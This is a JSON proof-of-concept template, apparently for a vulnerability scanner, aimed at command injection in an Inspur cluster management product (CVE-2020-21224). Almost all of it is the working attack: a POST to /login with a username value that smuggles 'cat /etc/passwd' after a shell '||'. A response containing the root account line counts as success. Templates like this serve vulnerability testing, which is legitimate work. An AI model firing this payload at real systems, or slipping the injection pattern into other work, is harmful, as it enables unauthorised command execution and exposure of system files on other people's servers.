{
    "Name": "浪潮tscev4命令执行",
    "Description": "浪潮tscev4命令执行cve-2020-21224",
    "Product": "浪潮",
    "author": "chumeng",
    "Request":[
        {
        "Method": "POST",
        "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
        "Uri":"/login",
        "Port":"",
        "Data":"op=login&username=admin || cat /etc/passwd&password=admin",
        "Follow_redirects":"false",
        "Upload":{"Name": "","fileName": "","filePath": "" },
        "Response":{
        "Check_Steps":"AND",
        "Checks": [
                {
                "Operation": "contains", 
                "Key":"",
                "Value": "root:x:0:0:"
                },
                 {
                "Operation": "code", 
                "Key":"",
                "Value": "200"  
                 }
        ]
        },
        "Next_decide":""
                }
]}

